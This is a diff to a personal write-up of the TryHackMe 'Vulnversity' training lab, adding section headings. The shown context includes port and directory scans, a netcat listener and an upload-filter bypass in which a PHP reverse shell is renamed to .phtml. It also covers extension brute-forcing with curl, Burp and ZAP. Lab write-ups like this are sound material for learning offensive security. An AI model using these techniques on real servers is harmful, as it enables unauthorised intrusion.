@@ -1,3 +1,25 @@
+# Vulnversity
+
+URL: https://tryhackme.com/room/vulnversity
+
+Level: easy
+
+Date: I already solved this machine on Dec 24 2020 (!!!); I am doing it again with *more advanced* /s stuff :) today is 1 Jul 2023
+
+- [NMAP](#nmap)
+- [Web Enumeration](#web-enumeration)
+- [Reverse Shell](#reverse-shell)
+- [Upgrade Shell](#upgrade-shell)
+- [Upload form](#upload-form)
+- [Upload with curl](#upload-with-curl)
+- [cURL bruteforce](#curl-bruteforce)
+- [Upload with python](#upload-with-python)
+- [Brute force with Burpsuite](#brute-force-with-burpsuite)
+- [Brute force with ZAP](#brute-force-with-zap)
+- [User flag](#user-flag)
+
+## nmap
+
 ```bash
 joshua@kaligra:~$ sudo nmap -T4 -p- -sV 10.10.206.250
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 10:03 CEST
@@ -17,6 +39,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 93.72 seconds
 ```
 
+## web enumeration
+
 feroxbuster:
 
 ```bash
@@ -29,7 +53,9 @@ joshua@kaligra:~$ feroxbuster -q -u http://10.10.206.250:3333 -n -t 5 -L 1 -w /u
 301      GET        9l       28w      324c http://10.10.206.250:3333/internal => http://10.10.206.250:3333/internal/
 ```
 
-reverse shell:
+## reverse shell
+
+I uploaded the classic PHP reverse shell (by simply renaming file to `shell.phtml`)
 
 ```bash
 joshua@kaligra:/opt/tools/shells$ nc -nvlp 4444
@@ -43,7 +69,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $
 ```
 
-upgrade shell:
+## upgrade shell
 
 ```bash
 $ which python3
@@ -59,7 +85,7 @@ www-data@vulnuniversity:/$
 www-data@vulnuniversity:/$
 ```
 
-index.php content:
+## upload form
 
 ```php
 www-data@vulnuniversity:/var/www/html/internal$ cat index.php
@@ -155,6 +181,8 @@ www-data@vulnuniversity:/var/www/html$ cat > sugo.php
 <h1 class="p">PHP Version 7.0.33-0ubuntu0.16.04.5</h1>
 ```
 
+## upload with curl
+
 how to upload file with `cURL`?
 
 let's inspect first the upload form:
@@ -198,6 +226,8 @@ Success</body>
 
 ```
 
+## curl bruteforce
+
 to do a very simple brute force (double quote!):
 
 ```bash
@@ -218,7 +248,7 @@ Success</body>
 </html>
 ```
 
-upload stuff with python:
+## upload with python
 
 ```python
 >>> import requests
@@ -226,7 +256,7 @@ upload stuff with python:
 >>> res = requests.post(url, files={"file": testfile})
 ```
 
-brute force with `Burpsuite`:
+## brute force with burpsuite
 
 intercept request, then send to `Intruder`,  then configure proper payload position:
 
@@ -262,7 +292,7 @@ Attack type = Sniper
 
 Payload type = Simple list
 
-brute force with ZAP
+## brute force with ZAP
 
 include your target to Context
 
@@ -287,7 +317,7 @@ Start fuzzer
 
 pay attention to Size Resp. Body
 
-userflag:
+## user flag
 
 ```bash
 www-data@vulnuniversity:/var/www/html$ ls /home/bill/
